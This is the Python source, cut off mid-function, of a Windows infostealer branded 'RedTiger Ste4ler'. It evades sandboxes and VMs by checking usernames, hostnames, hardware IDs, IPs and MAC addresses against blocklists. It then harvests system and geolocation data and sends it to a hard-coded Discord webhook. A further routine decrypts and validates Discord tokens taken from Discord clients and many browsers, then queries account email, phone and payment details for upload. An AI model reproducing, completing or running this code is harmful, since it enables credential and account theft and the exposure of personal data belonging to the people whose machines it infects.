
def Ant1_VM_4nd_D38ug():
    import os
    import socket
    import requests
    import subprocess
    import uuid

    b14ck_1i5t_u53rn4m35 = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'Bruno' 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
                            'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', 'stephpie']
    b14ck_1i5t_h05tn4m35 = ['0CC47AC83802', 'BEE7370C-8C0C-4', 'DESKTOP-ET51AJO', '965543', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O',
                            'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42', 'test']
    b14ck_1i5t_hw1d5 = ['671BC5F7-4B0F-FF43-B923-8B1645581DC8', '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D',
                            'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
    b14ck_1i5t_1p5 = ['181.214.153.11', '34.121.241.65', '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209',
                        '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
    b14ck_1i5t_m4c5 = ['0e:38:e1:85:16:5a', '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77',
                            '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']

    try:
        if os.getlogin() in b14ck_1i5t_u53rn4m35:
            return True
        elif os.getlogin().lower() in [u53rn4m3.lower() for u53rn4m3 in b14ck_1i5t_u53rn4m35]:
            return True
    except: pass

    try:
        if socket.gethostname() in b14ck_1i5t_h05tn4m35:
            return True
        elif socket.gethostname().lower() in [h05tn4m3.lower() for h05tn4m3 in b14ck_1i5t_h05tn4m35]:
            return True
    except: pass

    try:
        if ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1]) in b14ck_1i5t_m4c5:
            return True
    except: pass

    try: 
        if requests.get("https://api.ipify.org?format=json").json().get("ip", "None") in b14ck_1i5t_1p5:
            return True
    except: pass

    try: 
        if subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip() in b14ck_1i5t_hw1d5:
            return True
    except: pass

    return False

try: d3t3ct = Ant1_VM_4nd_D38ug()
except: d3t3ct = False

if d3t3ct == True:
    import sys
    sys.exit()

import sys
import os
import socket
import win32api
import requests
import time

def B10ck_K3y(): pass
def Unb10ck_K3y(): pass
def B10ck_T45k_M4n4g3r(): pass
def B10ck_M0u53(): pass
def B10ck_W3b5it3(): pass
def St4rtup(): pass
def Sy5t3m_Inf0(): pass
def Op3n_U53r_Pr0fi13_53tting5(): pass
def Scr33n5h0t(): pass
def C4m3r4_C4ptur3(): pass
def Di5c0rd_T0k3n(): pass
def Di5c0rd_inj3c710n(): pass
def Br0w53r_5t341(): pass
def R0b10x_C00ki3(): pass
def F4k3_3rr0r(): pass
def Sp4m_0p3n_Pr0gr4m(): pass
def Sp4m_Cr34t_Fil3(): pass
def Shutd0wn(): pass
    
def Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

w3bh00k_ur1 = "https://discord.com/api/webhooks/1349188983275651092/MP9nSdLoS0HnqtFOXwPEtFfIHbgmOe5AEvPjgyAzdSJOlWq1LI4IHw8l7xtVPktwTnyC"
website = "redtiger.shop"
color_embed = 0xa80505
username_embed = 'RedTiger Ste4ler'
avatar_embed = 'https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/RedTiger-Logo.png?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&'
footer_text = "RedTiger Ste4ler | https://github.com/loxyteck/RedTiger-Tools"
footer_embed = {
        "text": footer_text,
        "icon_url": avatar_embed,
        }
                 

try: hostname_pc = socket.gethostname()
except: hostname_pc = "None"

try: username_pc = os.getlogin()
except: username_pc = "None"

try: displayname_pc = win32api.GetUserNameEx(win32api.NameDisplay)
except: displayname_pc = "None"

try: ip_address_public = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: ip_address_public = "None"

try: ip_adress_local = socket.gethostbyname(socket.gethostname())
except: ip_adress_local = "None"

try:
    response = requests.get(f"https://{website}/api/ip/ip={ip_address_public}")
    api = response.json()

    country = api.get('country', "None")
    country_code = api.get('country_code', "None")
    region = api.get('region', "None")
    region_code = api.get('region_code', "None")
    zip_postal = api.get('zip', "None")
    city = api.get('city', "None")
    latitude = api.get('latitude', "None")
    longitude = api.get('longitude', "None")
    timezone = api.get('timezone', "None")
    isp = api.get('isp', "None")
    org = api.get('org', "None")
    as_number = api.get('as', "None")
except:
    response = requests.get(f"http://ip-api.com/json/{ip_address_public}")
    api = response.json()

    country = api.get('country', "None")
    country_code = api.get('countryCode', "None")
    region = api.get('regionName', "None")
    region_code = api.get('region', "None")
    zip_postal = api.get('zip', "None")
    city = api.get('city', "None")
    latitude = api.get('lat', "None")
    longitude = api.get('lon', "None")
    timezone = api.get('timezone', "None")
    isp = api.get('isp', "None")
    org = api.get('org', "None")
    as_number = api.get('as', "None")
def Sy5t3m_Inf0():
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import requests
    from discord import SyncWebhook, Embed

    try: sy5t3m_1nf0 = {platform.system()}
    except: sy5t3m_1nf0 = "None"

    try: sy5t3m_v3r5i0n_1nf0 = platform.version()
    except: sy5t3m_v3r5i0n_1nf0 = "None"

    try: m4c_4ddr355 = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: m4c_4ddr355 = "None"

    try: hw1d = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
    except: hw1d = "None"

    try: r4m_1nf0 = round(psutil.virtual_memory().total / (1024**3), 2)
    except: r4m_1nf0 = "None"

    try: cpu_1nf0 = platform.processor()
    except: cpu_1nf0 = "None"

    try: cpu_c0r3_1nf0 = psutil.cpu_count(logical=False)
    except: cpu_c0r3_1nf0 = "None"

    try: gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: gpu_1nf0 = "None"

    try:
        drives_info = []
        bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ":\\"
                try:
                    free_bytes = ctypes.c_ulonglong(0)
                    total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(drive_path), None, ctypes.pointer(total_bytes), ctypes.pointer(free_bytes))
                    total_space = total_bytes.value
                    free_space = free_bytes.value
                    used_space = total_space - free_space
                    drive_name = win32api.GetVolumeInformation(drive_path)[0]
                    drive = {
                        'drive': drive_path,
                        'total': total_space,
                        'free': free_space,
                        'used': used_space,
                        'name': drive_name,
                    }
                    drives_info.append(drive)
                except:
                    ()
            bitmask >>= 1

        d15k_5t4t5 = "{:<7} {:<10} {:<10} {:<10} {:<20}\n".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for drive in drives_info:
            use_percent = (drive['used'] / drive['total']) * 100
            free_space_gb = "{:.2f}GO".format(drive['free'] / (1024 ** 3))
            total_space_gb = "{:.2f}GO".format(drive['total'] / (1024 ** 3))
            use_percent_str = "{:.2f}%".format(use_percent)
            d15k_5t4t5 += "{:<7} {:<10} {:<10} {:<10} {:<20}".format(drive['drive'], 
                                                                   free_space_gb,
                                                                   total_space_gb,
                                                                   use_percent_str,
                                                                   drive['name'])
    except:
        d15k_5t4t5 = """Drive:  Free:      Total:     Use:       Name:       
None    None       None       None       None     
"""

    try:
        def is_portable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if is_portable():
            p14tf0rm_1nf0 = 'Pc Portable'
        else:
            p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        p14tf0rm_1nf0 = "None"

    try: scr33n_number = len(screeninfo.get_monitors())
    except: scr33n_number = "None"

    embed = Embed(title=f'System Info `{username_pc} "{ip_address_public}"`:', color=color_embed)

    embed.add_field(name=":bust_in_silhouette: User Pc:", value=f"""```Hostname    : {hostname_pc}
Username    : {username_pc}
DisplayName : {displayname_pc}```""", inline=False)

    embed.add_field(name=":computer: System:", value=f"""```Plateform     : {p14tf0rm_1nf0}
Exploitation  : {sy5t3m_1nf0} {sy5t3m_v3r5i0n_1nf0}
Screen Number : {scr33n_number}

HWID : {hw1d}
MAC  : {m4c_4ddr355}
CPU  : {cpu_1nf0}, {cpu_c0r3_1nf0} Core
GPU  : {gpu_1nf0}
RAM  : {r4m_1nf0}Go```""", inline=False)

    embed.add_field(name=":satellite: Ip:", value=f"""```Public : {ip_address_public}
Local  : {ip_adress_local}
Isp    : {isp}
Org    : {org}
As     : {as_number}```""", inline=False)

    embed.add_field(name=":minidisc: Disk:", value=f"""```{d15k_5t4t5}```""", inline=False)

    embed.add_field(name=":map: Location:", value=f"""```Country   : {country} ({country_code})
Region    : {region} ({region_code})
Zip       : {zip_postal}
City      : {city}
Timezone  : {timezone}
Latitude  : {latitude}
Longitude : {longitude}```""", inline=False)

    embed.set_footer(text=footer_text, icon_url=avatar_embed)

    w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
    w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)

def Di5c0rd_T0k3n():
    import os
    import re
    import json
    import base64
    import requests
    from Cryptodome.Cipher import AES
    from Cryptodome.Protocol.KDF import scrypt
    from win32crypt import CryptUnprotectData
    from discord import SyncWebhook, Embed

    def extr4ct_t0k3n5():
        base_url = "https://discord.com/api/v9/users/@me"
        appdata_local = os.getenv("localappdata")
        appdata_roaming = os.getenv("appdata")
        regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        t0k3n5 = []
        uids = []
        token_info = {}

        paths = {
            'Discord': appdata_roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': appdata_roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': appdata_roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': appdata_roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': appdata_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': appdata_roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': appdata_local + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': appdata_local + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': appdata_local + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': appdata_local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': appdata_local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': appdata_local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': appdata_local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': appdata_local + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome SxS': appdata_local + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Google Chrome': appdata_local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Google Chrome1': appdata_local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Google Chrome2': appdata_local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Google Chrome3': appdata_local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Google Chrome4': appdata_local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Google Chrome5': appdata_local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': appdata_local + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': appdata_local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Uran': appdata_local + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': appdata_local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': appdata_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': appdata_local + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            _d15c0rd = name.replace(" ", "").lower()
            if "cord" in path:
                if not os.path.exists(appdata_roaming + f'\\{_d15c0rd}\\Local State'):
                    continue
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for y in re.findall(regexp_enc, line.strip()):
                                t0k3n = decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), get_master_key(appdata_roaming + f'\\{_d15c0rd}\\Local State'))
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = (name, f"{path}\\{file_name}")
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    with open(f'{path}\\{file_name}', errors='ignore') as file:
                        for line in file:
                            for t0k3n in re.findall(regexp, line.strip()):
                                if validate_t0k3n(t0k3n, base_url):
                                    uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                    if uid not in uids:
                                        t0k3n5.append(t0k3n)
                                        uids.append(uid)
                                        token_info[t0k3n] = (name, f"{path}\\{file_name}")

        if os.path.exists(appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(appdata_roaming + "\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if _file.endswith('.sqlite'):
                        with open(f'{path}\\{_file}', errors='ignore') as file:
                            for line in file:
                                for t0k3n in re.findall(regexp, line.strip()):
                                    if validate_t0k3n(t0k3n, base_url):
                                        uid = requests.get(base_url, headers={'Authorization': t0k3n}).json()['id']
                                        if uid not in uids:
                                            t0k3n5.append(t0k3n)
                                            uids.append(uid)
                                            token_info[t0k3n] = ('Firefox', f"{path}\\{_file}")
        return t0k3n5, token_info

    def validate_t0k3n(t0k3n, base_url):
        return requests.get(base_url, headers={'Authorization': t0k3n}).status_code == 200

    def decrypt_val(buff, master_key):
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()

    def get_master_key(path):
        if not os.path.exists(path):
            return None
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        return CryptUnprotectData(master_key, None, None, None, 0)[1]

    def upload_t0k3n5():
        t0k3n5, token_info = extr4ct_t0k3n5()
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)

        if not t0k3n5:
            embed = Embed(
                title=f'Discord Token `{username_pc} "{ip_address_public}"`:', 
                description=f"No discord tokens found.",
                color=color_embed)
            embed.set_footer(text=footer_text, icon_url=avatar_embed)
            w3bh00k.send(embed=embed, username=username_embed, avatar_url=avatar_embed)
            return
        
        for t0k3n_d15c0rd in t0k3n5:
            api = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': t0k3n_d15c0rd}).json()

            u53rn4m3_d15c0rd = api.get('username', "None") + '#' + api.get('discriminator', "None")
            d15pl4y_n4m3_d15c0rd = api.get('global_name', "None")
            us3r_1d_d15c0rd = api.get('id', "None")
            em4i1_d15c0rd = api.get('email', "None")
            ph0n3_d15c0rd = api.get('phone', "None")
            c0untry_d15c0rd = api.get('locale', "None")
            mf4_d15c0rd = api.get('mfa_enabled', "None")

            try:
                if api.get('premium_type', 'None') == 0:
                    n1tr0_d15c0rd = 'False'
                elif api.get('premium_type', 'None') == 1:
                    n1tr0_d15c0rd = 'Nitro Classic'
                elif api.get('premium_type', 'None') == 2:
                    n1tr0_d15c0rd = 'Nitro Boosts'
                elif api.get('premium_type', 'None') == 3:
                    n1tr0_d15c0rd = 'Nitro Basic'
                else:
                    n1tr0_d15c0rd = 'False'
            except:
                n1tr0_d15c0rd = "None"

            try: 
                av4t4r_ur1_d15c0rd = f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{us3r_1d_d15c0rd}/{api['avatar']}.png"
            except: 
                av4t4r_ur1_d15c0rd = avatar_embed

            try:
                billing_discord = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': t0k3n_d15c0rd}).json()
                if billing_discord:
                    p4ym3nt_m3th0d5_d15c0rd = []

                    for method in billing_discord:
                        if method['type'] == 1:
                            p4ym3nt_m3th0d5_d15c0rd.append('CB')
                        elif method['type'] == 2:
                            p4ym3nt_m3th0d5_d15c0rd.append("Paypal")
                        else:
                            p4ym3nt_m3th0d5_d15c0rd.append('Other')
